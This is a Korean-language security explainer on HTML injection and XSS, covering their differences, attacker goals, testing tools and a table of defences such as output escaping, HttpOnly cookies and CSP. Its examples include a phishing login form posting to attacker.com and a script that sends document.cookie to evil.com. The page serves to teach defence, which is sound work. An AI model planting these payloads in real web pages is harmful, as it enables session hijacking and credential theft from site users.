# 🛡️ HTML 인젝션 & XSS (Cross-Site Scripting)

HTML 인젝션과 XSS는 **사용자 입력을 웹 페이지에 그대로 출력**할 때 발생하는 **클라이언트 측 취약점**입니다. 공격자는 HTML이나 JavaScript 코드를 삽입하여 **페이지를 조작하거나 악성 스크립트를 실행**할 수 있습니다.

---

## 📌 차이점 요약

| 구분         | HTML 인젝션                              | XSS (Cross-Site Scripting)                       |
|--------------|-------------------------------------------|--------------------------------------------------|
| 공격 코드    | HTML 태그                                 | JavaScript 코드                                  |
| 주된 영향    | UI 위조, 피싱 폼 생성                    | 스크립트 실행, 세션 탈취, 계정 가로채기         |
| 위험도       | 중간                                      | 높음                                             |
| 실행 위치    | HTML 렌더링 엔진                          | JavaScript 엔진                                  |
| 예시         | `<h1>해킹됨</h1>`                         | `<script>alert(1)</script>`                      |

---

## 🎯 공격 목적

- UI 조작 및 피싱 유도
- 세션 쿠키 및 인증 정보 탈취
- 악성 스크립트 실행 통한 브라우저 내 제어
- 내부 관리자 권한 획득 시도

---

## 🔧 사용 도구

- **Burp Suite** – HTTP 요청 가로채기 및 조작
- **OWASP ZAP** – 자동화된 웹 취약점 진단 도구
- **Dalfox / XSStrike** – XSS 자동 진단 도구
- **브라우저 개발자 도구** – DOM 수정 및 실행 확인

---

## 💥 공격 예시

### HTML 인젝션

<pre>
&lt;h1&gt;이 페이지는 해킹되었습니다&lt;/h1&gt;
&lt;form action="https://attacker.com/phish" method="POST"&gt;
  &lt;input type="text" name="id"&gt;
  &lt;input type="password" name="pw"&gt;
  &lt;button type="submit"&gt;로그인&lt;/button&gt;
&lt;/form&gt;
</pre>

### XSS

<pre>
&lt;script&gt;fetch('https://evil.com?c=' + document.cookie)&lt;/script&gt;
&lt;img src="x" onerror="alert('XSS 발생!')"&gt;
</pre>

---

## ⚠️ 보안 위험 및 ✅ 대응 방안

| ⚠️ 보안 위험                                                        | ✅ 대응 방안                                                                 |
|--------------------------------------------------------------------|------------------------------------------------------------------------------|
| 사용자 계정 탈취 및 인증 우회                                       | 입력값 검증 및 출력 이스케이프 처리 (HTML/JS 특수문자 필터링)              |
| 피싱 폼 삽입 및 UI 위조                                             | 화이트리스트 기반 필터링 및 DOM Sanitization 적용                           |
| 세션 쿠키 및 민감 정보 탈취                                         | HttpOnly / Secure / SameSite 속성 적용한 쿠키 사용                          |
| 외부 악성 스크립트 삽입                                            | Content-Security-Policy (CSP) 헤더 설정                                     |
| DOM 변조 또는 이벤트 훅킹                                           | 출력 시 맥락(Context)에 따른 적절한 이스케이프                             |
| 사용자 에이전트를 통한 리플렉션 기반 XSS 유도                       | 보안 헤더 적용 (`X-XSS-Protection`, `X-Content-Type-Options`) 등 적용       |

---

> 🔐 **TIP**: `"입력 시 검증 → 저장 시 정제 → 출력 시 이스케이프"`의 3단계 보안 원칙을 항상 기억하세요.
